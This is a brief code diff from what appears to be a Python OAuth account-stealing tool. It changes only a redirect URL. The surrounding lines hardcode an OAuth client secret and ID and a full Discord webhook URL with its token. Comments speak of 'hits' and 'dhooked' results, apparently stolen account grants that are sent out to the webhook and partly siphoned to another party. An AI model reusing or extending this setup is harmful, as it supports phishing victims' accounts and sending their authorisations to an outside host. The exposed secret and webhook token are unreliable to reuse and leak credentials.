@@ -14,7 +14,7 @@ import json
 # -- Variables --
 client_secret = "71786446-3bdc-42b1-ab09-efbcf4e5f624"#self exp
 client_id = '9f260e54e-b889-4e5f-8415-f1a4c1006a2f' #self exp
-redirect_uri = 'https://public-oauth-5.onrender.com/verify' #your url with /verify at the end
+redirect_uri = 'https://public-oauth-7.onrender.com/verify' #your url with /verify at the end
 webhook_url = 'https://discord.com/api/webhooks/1515695901216346322/hFAbhFau7f2CZe2V8bF_RqcFPT7PJLCDXyHeW6lYSLsrYxkXS8ZG9e1WFIqh23uB3WDE' #dhook
 hit_url = '' #where hits should be listed (dhooked shit will be listed too too lazy to change)
 nwlimit = 12022220 #dhook amount
